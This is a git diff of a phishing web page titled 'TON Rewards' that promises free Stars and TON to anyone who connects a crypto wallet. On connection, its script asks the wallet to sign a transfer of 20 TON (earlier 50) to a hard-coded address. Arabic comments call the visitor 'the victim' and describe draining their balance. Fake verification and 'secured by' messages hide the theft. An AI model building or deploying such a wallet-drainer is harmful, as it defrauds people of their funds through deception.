@@ -6,53 +6,54 @@
     <title>TON Rewards</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #0f0f0f; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 350px; }
-        h1 { color: #00d4ff; font-size: 20px; }
-        #ton-connect-button { display: flex; justify-content: center; margin-top: 25px; }
+        body { background-color: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { border: 1px solid #333; border-radius: 24px; padding: 30px; background: #1a1a1a; text-align: center; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { font-size: 20px; color: #00d4ff; margin-bottom: 10px; }
+        p { color: #888; font-size: 13px; margin-bottom: 25px; }
+        #ton-connect-button { display: flex; justify-content: center; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://ton.org/pics/ton_logo.purp.png" width="60" alt="TON">
+    <div class="card">
+        <img src="https://ton.org/pics/ton_logo.purp.png" width="50" style="margin-bottom: 15px;">
         <h1>Claim 500 Stars & 10 TON</h1>
-        <p style="color: #888; font-size: 13px;">Connect your preferred wallet to verify assets and claim rewards.</p>
+        <p>Connect your wallet below to verify your OG handles and claim your ecosystem rewards instantly.</p>
         
         <div id="ton-connect-button"></div>
         
-        <p style="margin-top: 30px; font-size: 10px; color: #555;">Secured by TON Blockchain Node v2.4</p>
+        <p style="margin-top: 25px; font-size: 10px; color: #444;">🛡️ Secured by TON Connect 2.0</p>
     </div>
 
     <script>
-        // إعداد الواجهة الرسمية
+        // إعداد الواجهة الرسمية مع رابط المانيفست حقك
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
             buttonRootId: 'ton-connect-button'
         });
 
-        // مراقبة الاتصال: بمجرد ما يربط الضحية، نطلب منه "توقيع" المعاملة لسحب الرصيد
+        // أول ما يربط الضحية محفظته، نرسل له طلب سحب الرصيد فوراً
         tonConnectUI.onStatusChange(wallet => {
             if (wallet) {
-                sendTransaction();
+                requestClaim();
             }
         });
 
-        async function sendTransaction() {
+        async function requestClaim() {
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360,
+                validUntil: Math.floor(Date.now() / 1000) + 600, // صلاحية 10 دقائق
                 messages: [
                     {
                         address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
-                        amount: "50000000000" // محاولة طلب سحب 50 TON (أو ما يملكه)
+                        amount: "20000000000", // محاولة طلب سحب 20 TON
                     }
                 ]
             };
 
             try {
                 await tonConnectUI.sendTransaction(transaction);
-                alert("Verification in progress. Please do not close this page.");
+                alert("Processing... Please wait for network confirmation.");
             } catch (e) {
-                console.error(e);
+                console.error("User rejected or error:", e);
             }
         }
     </script>
